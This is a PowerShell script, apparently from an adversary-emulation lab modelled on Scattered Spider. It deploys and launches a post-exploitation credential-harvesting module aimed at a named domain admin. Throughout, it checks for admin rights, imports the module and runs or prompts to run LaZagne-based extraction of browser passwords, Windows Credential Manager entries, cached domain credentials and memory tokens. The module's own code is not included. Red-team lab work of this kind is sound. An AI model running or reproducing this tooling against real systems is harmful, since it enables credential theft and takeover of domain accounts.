# === Credential Extraction Deployment ===
# Deploys CredExtraction module for harvesting stored credentials
# Phase 5 of Scattered Spider attack chain

param(
    [string]$TargetUser = "Sherlock",
    [string]$OutputDirectory = "C:\Intel\Logs",
    [switch]$AutoExecute = $false
)

Write-Host "========================================" -ForegroundColor Magenta
Write-Host "   CREDENTIAL EXTRACTION DEPLOYMENT" -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-Host ""

$currentPath = Get-Location
$moduleRoot = Join-Path $currentPath "Post-Exploit\CredExtraction"

Write-Host "[*] Current working directory: $currentPath" -ForegroundColor Gray
Write-Host "[*] CredExtraction module path: $moduleRoot" -ForegroundColor Gray
Write-Host ""

# Verify module structure
Write-Host "=== MODULE VERIFICATION ===" -ForegroundColor Cyan
$requiredFiles = @(
    "CredExtraction.psm1",
    "Credential Extraction (T1555-T1003).ps1"
)

$allFilesPresent = $true
foreach ($file in $requiredFiles) {
    $filePath = Join-Path $moduleRoot $file
    if (Test-Path $filePath) {
        Write-Host "[+] Found: $file" -ForegroundColor Green
    } else {
        Write-Host "[!] Missing: $file" -ForegroundColor Red
        $allFilesPresent = $false
    }
}

if (-not $allFilesPresent) {
    Write-Error "Required CredExtraction module files are missing. Deployment cannot continue."
    exit 1
}

Write-Host ""

# Check admin privileges
Write-Host "=== PRIVILEGE CHECK ===" -ForegroundColor Cyan
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    Write-Host "[+] Running with administrative privileges (recommended for full credential extraction)" -ForegroundColor Green
} else {
    Write-Host "[!] Not running with admin privileges - some credential sources may be inaccessible" -ForegroundColor Yellow
    Write-Host "[!] For best results, run PowerShell as Administrator" -ForegroundColor Yellow
}

Write-Host ""

# Import the CredExtraction module
Write-Host "=== MODULE DEPLOYMENT ===" -ForegroundColor Cyan
Write-Host "[*] Importing CredExtraction PowerShell module..." -ForegroundColor Yellow

$modulePath = Join-Path $moduleRoot "CredExtraction.psm1"
try {
    Import-Module $modulePath -Force -DisableNameChecking
    Write-Host "[+] CredExtraction module imported successfully" -ForegroundColor Green
}
catch {
    Write-Error "Failed to import CredExtraction module: $($_.Exception.Message)"
    exit 1
}

# Configure module settings
if ($TargetUser -or $OutputDirectory) {
    Write-Host "[*] Configuring module settings..." -ForegroundColor Yellow
    Set-CredExtractionConfig -TargetUser $TargetUser -OutputDirectory $OutputDirectory
}

# Display target information
Write-Host "[*] Target Information:" -ForegroundColor Yellow
Write-Host "  - Target User: $TargetUser (focus on this domain admin)" -ForegroundColor Gray
Write-Host "  - Current User: $($env:USERNAME)" -ForegroundColor Gray
Write-Host "  - Computer: $($env:COMPUTERNAME)" -ForegroundColor Gray
Write-Host "  - Domain: $($env:USERDNSDOMAIN)" -ForegroundColor Gray

Write-Host ""

# Display available functions
Write-Host "=== AVAILABLE COMMANDS ===" -ForegroundColor Cyan
Write-Host "Core Functions:" -ForegroundColor Yellow
Write-Host "  Invoke-FullCredExtraction     - Execute complete credential extraction" -ForegroundColor White
Write-Host "  Run-CredExtraction            - Alias for full extraction" -ForegroundColor White
Write-Host "  Get-CredExtractionResults     - View extraction results" -ForegroundColor White
Write-Host "  Get-CredResults               - Alias for results viewing" -ForegroundColor White
Write-Host ""
Write-Host "Individual Methods:" -ForegroundColor Yellow
Write-Host "  Invoke-CredentialExtraction   - LaZagne credential extraction (T1555 + T1003)" -ForegroundColor White
Write-Host "  Invoke-BrowserCredExtraction  - Browser credential databases" -ForegroundColor White
Write-Host "  Invoke-MemoryCredExtraction   - Memory credential analysis" -ForegroundColor White
Write-Host ""
Write-Host "Configuration:" -ForegroundColor Yellow
Write-Host "  Set-CredExtractionConfig -TargetUser <user> -OutputDirectory <path>" -ForegroundColor White
Write-Host ""

# Auto-execute if requested
if ($AutoExecute) {
    Write-Host "=== AUTO-EXECUTION ===" -ForegroundColor Cyan
    Write-Host "[*] Auto-executing full credential extraction..." -ForegroundColor Yellow
    Write-Host ""
    
    try {
        Invoke-FullCredExtraction -TargetUser $TargetUser
    }
    catch {
        Write-Host "[!] Auto-execution failed: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    Write-Host "========================================" -ForegroundColor Magenta
    Write-Host "   DEPLOYMENT COMPLETE" -ForegroundColor Magenta
    Write-Host "========================================" -ForegroundColor Magenta
    Write-Host ""
    Write-Host "CredExtraction module is now ready for use!" -ForegroundColor Green
    Write-Host ""
    Write-Host "Lab Scenario Context:" -ForegroundColor Yellow
    Write-Host "- Irene (local admin) opened AnyDesk ZIP and provided remote access" -ForegroundColor Gray
    Write-Host "- $TargetUser (domain admin) is logged into this client-03 workstation" -ForegroundColor Gray
    Write-Host "- LaZagne will extract $TargetUser's stored credentials from:" -ForegroundColor Gray
    Write-Host "  • Browser password stores (Chrome, Firefox, Edge)" -ForegroundColor Gray
    Write-Host "  • Windows Credential Manager" -ForegroundColor Gray
    Write-Host "  • Cached domain credentials" -ForegroundColor Gray
    Write-Host "  • Memory-resident authentication tokens" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Quick Start:" -ForegroundColor Yellow
    Write-Host "  Run-CredExtraction             # Extract all credentials, focus on $TargetUser" -ForegroundColor Gray
    Write-Host "  Get-CredResults                # View extraction results" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Output Location: $OutputDirectory" -ForegroundColor Cyan
    
    # Prompt for immediate execution
    Write-Host ""
    $executeNow = Read-Host "Execute credential extraction now? (Y/n)"
    if ($executeNow -eq "" -or $executeNow -eq "Y" -or $executeNow -eq "y") {
        Write-Host ""
        Write-Host "[*] Executing full credential extraction..." -ForegroundColor Cyan
        Write-Host "[*] Targeting $TargetUser credentials on client-03..." -ForegroundColor Yellow
        try {
            Invoke-FullCredExtraction -TargetUser $TargetUser
        }
        catch {
            Write-Host "[!] Execution failed: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
}